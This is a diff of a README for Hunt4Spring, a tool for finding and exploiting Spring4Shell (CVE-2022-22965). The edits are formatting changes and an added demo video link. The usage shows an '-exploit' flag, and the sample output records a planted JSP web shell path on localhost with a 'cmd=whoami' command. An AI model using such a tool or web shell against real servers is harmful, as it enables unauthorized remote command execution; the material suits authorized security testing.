@@ -1,8 +1,8 @@
 # Hunt4Spring
 
-Hunt4Spring helps with identifying as well as exploiting URLs which are potentially vulnerable to <a href="https://tanzu.vmware.com/security/cve-2022-22965">CVE-2022-22965</a> aka Spring4Shell.
+Hunt4Spring helps with identifying as well as exploiting URLs which are potentially vulnerable to [CVE-2022-22965](https://tanzu.vmware.com/security/cve-2022-22965) aka Spring4Shell.
 
-**Video Demo:**
+**Video Demo:** https://www.youtube.com/watch?v=JnAnXDFKkF0
 
 ## Usage :
 
@@ -169,15 +169,14 @@ $ ./hunt4spring -file test.txt -exploit
 
 ### Output
 The output file saves the data in JSON format like below:
-#### Example
 ```json
 [
-        {
+    {
         "host": "http://127.0.0.1:8080/",
         "is_vulnerable": true,
         "exploit_completed": true,
         "payload_path": "http://127.0.0.1:8080/shell.jsp?pwd=hunt4spring\u0026cmd=whoami"
-        }
+    }
 ]
 ```
 
